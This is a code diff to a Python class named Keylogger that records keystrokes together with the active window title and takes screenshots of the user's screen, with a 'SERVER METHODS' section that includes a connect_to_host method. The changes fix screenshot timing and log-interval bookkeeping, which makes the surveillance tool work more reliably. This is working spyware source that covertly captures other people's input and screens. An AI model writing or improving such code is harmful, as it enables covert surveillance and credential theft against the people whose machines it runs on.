@@ -109,15 +109,15 @@ class Keylogger:
                         f"------------------------\n\n"
                         f"{self.log}"
                     ))
-            self.start_time = datetime.now()
         self.log = ""
 
     def screenshot(self):
-        if not os.path.exists(self.log_directory):
-                os.makedirs(self.log_directory)
+        if self.log:
+            if not os.path.exists(self.log_directory):
+                    os.makedirs(self.log_directory)
         
-        filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
-        pyautogui.screenshot(os.path.join(self.log_directory, filename))
+            filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
+            pyautogui.screenshot(os.path.join(self.log_directory, filename))
 
 #--------------- SERVER METHODS ---------------#
     def connect_to_host(self):
@@ -191,19 +191,20 @@ class Keylogger:
         while True:
             if self.active:
                 current_window = GetWindowText(GetForegroundWindow())
-                timenow = datetime.now()
+                self.end_time = datetime.now()
 
                 if current_window != self.foreground_window:
                     self.write_keylogs_to_file(self.foreground_window)
                     self.screenshot()
                     self.foreground_window = current_window
                     self.filecounter = 0
+                    self.start_time = datetime.now()
 
-                elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
-                    self.end_time = timenow
+                elif (self.end_time - self.start_time) >= timedelta(seconds=self.log_interval):
                     self.write_keylogs_to_file(current_window)
                     self.screenshot()
-                    self.filecounter += 1
+                    self.filecounter += 1                    
+                    self.start_time = datetime.now()
 
             time.sleep(self.window_interval)
 
